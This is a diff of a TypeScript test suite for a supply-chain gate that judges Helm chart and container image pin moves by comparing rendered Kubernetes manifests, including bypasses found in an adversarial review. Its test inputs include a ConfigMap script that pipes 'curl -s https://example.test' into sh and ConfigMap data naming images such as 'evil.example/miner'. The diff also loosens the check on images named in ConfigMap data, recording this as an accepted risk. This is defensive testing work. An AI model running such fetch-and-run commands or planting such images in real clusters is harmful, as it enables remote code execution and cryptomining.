@@ -25,6 +25,7 @@ import {
   POSTGRES_FILE,
   patchedByTheCheck,
   pinMove,
+  placeholders,
   type Rewritten,
   type Run,
   ranIt,
@@ -776,18 +777,23 @@ describe("a change's lines", () => {
   });
 });
 
+/** A chart's move from 1.0.0 to 1.0.1, as condition 6 is told it. */
+const X = { chart: 'x', from: '1.0.0', to: '1.0.1' };
+
 describe('the manifests and the records', () => {
   it("ignores the moved image's references and the chart's own version labels, and nothing else", () => {
     const object = (version: string, image: string) =>
       `kind: Pod\nmetadata:\n  name: x\n  labels:\n    helm.sh/chart: x-${version}\nspec:\n  image: ${image}\n  env: [${image}]`;
     const base = object('1.0.0', `a:1@sha256:${hex('1')}`);
     const head = object('1.0.1', `a:2@sha256:${hex('2')}`);
-    const refs = [`a:1@sha256:${hex('1')}`, `a:2@sha256:${hex('2')}`];
-    expect(manifestsDiffer(base, head, refs)).toBeUndefined();
-    expect(manifestsDiffer(base, `${head}\n  more: 1`, refs)).toBe(
+    const refs = [{ from: `a:1@sha256:${hex('1')}`, to: `a:2@sha256:${hex('2')}` }];
+    const x = { chart: 'x', from: '1.0.0', to: '1.0.1' };
+    expect(manifestsDiffer(base, head, refs, x)).toBeUndefined();
+    expect(manifestsDiffer(base, head, refs)).toMatch(/a version label changes in a move that moves no chart/);
+    expect(manifestsDiffer(base, `${head}\n  more: 1`, refs, x)).toBe(
       'the manifests change beyond the image: Pod x at spec.more',
     );
-    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs)).toBe(
+    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs, x)).toBe(
       'the manifests change beyond the image: Pod x at spec.envs',
     );
     expect(manifestsDiffer('', '', refs)).toMatch(/empty/);
@@ -1003,7 +1009,7 @@ describe('a pin move holds where an attacker would aim at its inputs', () => {
         '  source:',
         `    chart: ${chart}`,
       ].join('\n');
-    expect(manifestsDiffer(rendering('prometheus'), rendering('something-else'), [])).toBe(
+    expect(manifestsDiffer(rendering('prometheus'), rendering('something-else'), [], X)).toBe(
       'the manifests change beyond the image: Application prometheus at spec.source.chart',
     );
   });
@@ -1362,8 +1368,8 @@ describe('the manifests, object by object', () => {
     const [was, now] = [recorded(item, from), recorded(item, to)];
     const pairs = await imagePairs(move, { render: async (side) => (side === 'base' ? was : now) });
     if (typeof pairs === 'string') throw new Error(pairs);
-    const refs = pairs.flatMap((p) => [p.from, p.to, p.from.split('@')[1] ?? '', p.to.split('@')[1] ?? '']);
-    return manifestsDiffer(was, now, refs);
+    const name = item === 'otel-collector' ? 'opentelemetry-collector' : item;
+    return manifestsDiffer(was, now, pairs, { chart: name, from, to });
   };
 
   it("passes tempo's and otel-collector's releases, whose ConfigMaps and checksums change with their images", async () => {
@@ -1403,8 +1409,9 @@ describe('the manifests, object by object', () => {
   const configMap = (data: string, name = 'app', extra = '') =>
     `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: ${name}\n  namespace: t\n${extra}data:\n  config.yaml: ${data}\n`;
   const base = `${configMap('a')}---\n${deployment()}`;
-  // The references as the gate gives them: each moved image's, and its digest alone.
-  const judge = (head: string, was = base) => manifestsDiffer(was, head, [IMAGE, IMAGE.split('@')[1] as string]);
+  // The image stays where it is: its pair's placeholder at both.
+  const SAME = [{ from: IMAGE, to: IMAGE }];
+  const judge = (head: string, was = base) => manifestsDiffer(was, head, SAME);
 
   it("passes a ConfigMap's data beside its pod template's checksum, written in any whitespace", () => {
     expect(judge(`${configMap('b')}---\n${deployment({ template: 'checksum/config: bbb' })}`)).toBeUndefined();
@@ -1528,21 +1535,10 @@ describe('the manifests, object by object', () => {
     );
   });
 
-  it("holds an image a ConfigMap's data names that its base did not, however it writes it", () => {
-    for (const named of [
-      `'{"image":"evil.io/x/y:1"}'`,
-      `'image = "evil/y@sha256:${hex('9')}"'`,
-      `'pull sha256:${hex('9')}'`,
-    ])
-      expect(judge(`${configMap(named)}---\n${deployment()}`)).toMatch(
-        /^ConfigMap t\/app's data names an image its base did not: /,
-      );
-    // The same images at both, a URL's path, and the moved image itself are no new image.
-    const same = `'{"image":"quay.io/x/y:1","url":"https://example.test/a/b:c"}'`;
-    expect(
-      judge(`${configMap(same)}---\n${deployment()}`, `${configMap(`'${same.slice(1, -1)} '`)}---\n${deployment()}`),
-    ).toBeUndefined();
-    expect(judge(`${configMap(`'runs ${IMAGE}'`)}---\n${deployment()}`)).toBeUndefined();
+  it("passes an image a ConfigMap's data names, however it writes it: its configuration is the publisher's", () => {
+    // Accepted, as ADR 0019 says: a controller launching it would run it unresolved and unscanned.
+    for (const named of [`'{"image":"evil.io/x/y:1"}'`, "'image = evil.example/miner'", "'docker://evil.example/m:6'"])
+      expect(judge(`${configMap(named)}---\n${deployment()}`)).toBeUndefined();
   });
 
   it('splits the rendering on `---` alone, as the cluster does, and holds a document a `...` begins', () => {
@@ -1557,18 +1553,6 @@ describe('the manifests, object by object', () => {
   });
 
   it('holds what an adversarial review found the first reading let through', () => {
-    // An image with no repository path, by tag or by digest.
-    expect(judge(`${configMap(`'{"image":"busybox:1.36"}'`)}---\n${deployment()}`)).toBe(
-      "ConfigMap t/app's data names an image its base did not: busybox:1.36",
-    );
-    // A word that only begins with the moved image is not the moved image.
-    const tagged = (data: string) => `${configMap(data)}---\n${deployment()}`;
-    expect(manifestsDiffer(tagged("'repo/app:0'"), tagged("'repo/app:1-x'"), ['repo/app:0', 'repo/app:1'])).toBe(
-      "ConfigMap t/app's data names an image its base did not: repo/app:1-x",
-    );
-    expect(
-      manifestsDiffer(tagged("'repo/app:0'"), tagged("'repo/app:1'"), ['repo/app:0', 'repo/app:1']),
-    ).toBeUndefined();
     // A namespace written empty is not one left out.
     const spaced = (ns: string) => `kind: Pod\nmetadata:\n  name: p\n${ns}`;
     expect(manifestsDiffer(spaced(''), spaced('  namespace: ""\n'), [])).toBe(
@@ -1582,7 +1566,7 @@ describe('the manifests, object by object', () => {
     );
     // A timestamp YAML 1.1 reads as a Date keeps its time through the image and label passes.
     const at = new Date('2031-01-01');
-    expect(record(record(comparable({ kind: 'Pod', spec: { at } }, [IMAGE])).spec).at).toBe(at);
+    expect(record(record(comparable({ kind: 'Pod', spec: { at } }, placeholders(SAME, 'base'))).spec).at).toBe(at);
   });
 
   it('reads a merge key, a timestamp and a version label that is not a string as YAML 1.1 does, and holds', () => {
@@ -1621,8 +1605,10 @@ describe('the manifests, object by object', () => {
   it("holds a chart's version label key added, or one written outside metadata's labels", () => {
     const labelled = (labels: string, selector = '{}') =>
       `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\n  labels: { ${labels} }\nspec:\n  selector: ${selector}\n`;
-    expect(manifestsDiffer(labelled('helm.sh/chart: x-1'), labelled('helm.sh/chart: x-2'), [])).toBeUndefined();
-    expect(manifestsDiffer(labelled('a: b'), labelled('a: b, helm.sh/chart: x-2'), [])).toBe(
+    expect(
+      manifestsDiffer(labelled('helm.sh/chart: x-1.0.0'), labelled('helm.sh/chart: x-1.0.1'), [], X),
+    ).toBeUndefined();
+    expect(manifestsDiffer(labelled('a: b'), labelled('a: b, helm.sh/chart: x-1.0.1'), [], X)).toBe(
       'the manifests change beyond the image: Service s at metadata.labels["helm.sh/chart"]',
     );
     const selected = (v: string) => labelled('a: b', `{ app.kubernetes.io/version: "${v}" }`);
@@ -1634,7 +1620,7 @@ describe('the manifests, object by object', () => {
   it("passes a ConfigMap another workload runs as a script: the publisher's either way, as its image is", () => {
     const script = (body: string) =>
       `${configMap(body, 'hooks')}---\n${deployment({ pod: 'volumes: [{ name: h, configMap: { name: hooks, defaultMode: 0755 } }]' })}`;
-    expect(manifestsDiffer(script('echo ok'), script('curl -s https://example.test | sh'), [IMAGE])).toBeUndefined();
+    expect(manifestsDiffer(script('echo ok'), script('curl -s https://example.test | sh'), SAME)).toBeUndefined();
   });
 
   it('holds RBAC, a container argument, a volume, a hostPath and a Service port', () => {
@@ -1658,7 +1644,7 @@ describe('the manifests, object by object', () => {
       ],
     ];
     for (const [was, now, at] of pairs)
-      expect(manifestsDiffer(pod(was), pod(now), [IMAGE])).toBe(
+      expect(manifestsDiffer(pod(was), pod(now), SAME)).toBe(
         `the manifests change beyond the image: Deployment t/app at spec.template.spec.${at}`,
       );
     const service = (port: number) =>
@@ -1666,5 +1652,95 @@ describe('the manifests, object by object', () => {
     expect(manifestsDiffer(service(80), service(8080), [])).toBe(
       'the manifests change beyond the image: Service s at spec.ports[0].port',
     );
+  });
+});
+
+// The independent read of #1065 at a05a0283: each bypass it demonstrated, now a hold.
+describe('condition 6 where the independent read of #1065 aimed', () => {
+  const OLD = `docker.io/acme/app:1.0.0@sha256:${hex('a')}`;
+  const NEW = `docker.io/acme/app:1.1.0@sha256:${hex('b')}`;
+  const MOVE = [{ from: OLD, to: NEW }];
+  const ACME = { chart: 'acme', from: '1.0.0', to: '1.1.0' };
+  const deploy = (img: string, version: string, chart = `acme-${version}`) => `---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app
+  namespace: ns
+  labels:
+    helm.sh/chart: ${chart}
+    app.kubernetes.io/version: "${version}"
+spec:
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/version: "${version}"
+    spec:
+      containers:
+        - name: app
+          image: ${img}
+`;
+  const netpol = `---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata: {name: lockdown, namespace: ns}
+spec:
+  podSelector:
+    matchLabels: {app.kubernetes.io/version: "1.0.0"}
+`;
+
+  it("passes the chart's own version labels moving with it", () => {
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, '1.1.0'), MOVE, ACME)).toBeUndefined();
+  });
+
+  it('holds a version label that takes a value no version is, or another chart’s', () => {
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, 'role=admin', 'acme-1.1.0'), MOVE, ACME)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at metadata.labels["app.kubernetes.io/version"]: role=admin is no version',
+    );
+    expect(manifestsDiffer(deploy(OLD, '1.0.0'), deploy(NEW, '1.1.0', 'acme-9.9.9'), MOVE, ACME)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at metadata.labels["helm.sh/chart"]: acme-9.9.9 is not acme-1.1.0',
+    );
+    // A subchart's label moves on its own name, at a version.
+    const sub = (v: string) => deploy(OLD, '1.0.0', `sub-${v}`);
+    expect(manifestsDiffer(sub('2.0.1'), sub('2.5.1').replace(OLD, NEW), MOVE, ACME)).toBeUndefined();
+    expect(manifestsDiffer(sub('2.0.1'), deploy(NEW, '1.0.0', 'other-2.5.1'), MOVE, ACME)).toMatch(
+      /other-2\.5\.1 is not sub-2\.0\.1's chart at another version/,
+    );
+  });
+
+  it('holds the version labels moving where anything selects by one', () => {
+    expect(manifestsDiffer(deploy(OLD, '1.0.0') + netpol, deploy(NEW, '1.1.0') + netpol, MOVE, ACME)).toBe(
+      'NetworkPolicy ns/lockdown names a version label at spec.podSelector.matchLabels["app.kubernetes.io/version"], and the chart\'s version labels change',
+    );
+  });
+
+  it('holds a container left on the old image, and one pair’s image in another’s place', () => {
+    const two = (a: string, b: string) =>
+      deploy(a, '1.0.0').replace(
+        `          image: ${a}\n`,
+        `          image: ${a}\n        - name: side\n          image: ${b}\n`,
+      );
+    expect(manifestsDiffer(two(OLD, OLD), two(NEW, OLD), MOVE)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at spec.template.spec.containers[1].image',
+    );
+    const OTHER = { from: `docker.io/acme/side:1@sha256:${hex('c')}`, to: `docker.io/acme/side:2@sha256:${hex('d')}` };
+    expect(manifestsDiffer(two(OLD, OTHER.from), two(OTHER.to, NEW), [...MOVE, OTHER])).toBe(
+      'the manifests change beyond the image: Deployment ns/app at spec.template.spec.containers[0].image',
+    );
+    expect(manifestsDiffer(two(OLD, OTHER.from), two(NEW, OTHER.to), [...MOVE, OTHER])).toBeUndefined();
+  });
+
+  it('holds a key that is no string, which could stand for another of the same text', () => {
+    const svc = (selector: string) =>
+      `apiVersion: v1\nkind: Service\nmetadata: {name: s, namespace: ns}\nspec:\n  selector: ${selector}\n`;
+    expect(manifestsDiffer(svc('{"1": safe}'), svc('{1: other, "1": safe}'), [])).toMatch(/a key that is not a string/);
+    expect(manifestsDiffer(svc('{"1": safe}'), svc('{0x1: other, "1": safe}'), [])).toMatch(
+      /a key that is not a string/,
+    );
+    // YAML 1.2 reads `yes` as a key of its own, a difference; YAML 1.1 as true, no string.
+    expect(manifestsDiffer(svc('{"true": safe}'), svc('{yes: other, "true": safe}'), [])).toBe(
+      'the manifests change beyond the image: Service ns/s at spec.selector.yes',
+    );
+    expect(objectsOf(svc('{yes: other, "true": safe}'), '1.1')).toMatch(/a key that is not a string/);
   });
 });
